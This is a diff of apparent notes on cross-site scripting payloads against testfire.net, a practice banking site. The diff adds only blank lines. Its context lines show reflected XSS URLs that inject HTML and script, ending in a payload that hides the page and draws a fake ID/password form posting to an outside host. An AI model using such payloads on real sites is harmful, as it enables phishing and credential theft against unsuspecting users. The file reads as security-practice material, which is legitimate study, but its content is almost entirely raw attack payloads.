@@ -12,6 +12,35 @@ http://testfire.net/search.aspx?txtSearch=<h1>Can you see this?</h1>
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 take it to the next level...
 
 http://testfire.net/search.aspx?txtSearch=
@@ -28,6 +57,41 @@ http://testfire.net/search.aspx?txtSearch=<script>document.body.innerHTML="<styl
 
 
 ==============================================================
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 Lets get dangerous...
@@ -49,3 +113,27 @@ document.body.innerHTML="<style>body{visiblity:hidden;}</style>
 </script>
 
 http://testfire.net/search.aspx?txtSearch=<script>document.body.innerHTML="<style>body{visiblity:hidden;}</style><div style=visibility:visible;><form action=http://www.cnn.com>ID:<input type=text name=id><br>PW:<input type=text name=pw><br><input type=submit value=submit></form></div><br><br>";</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
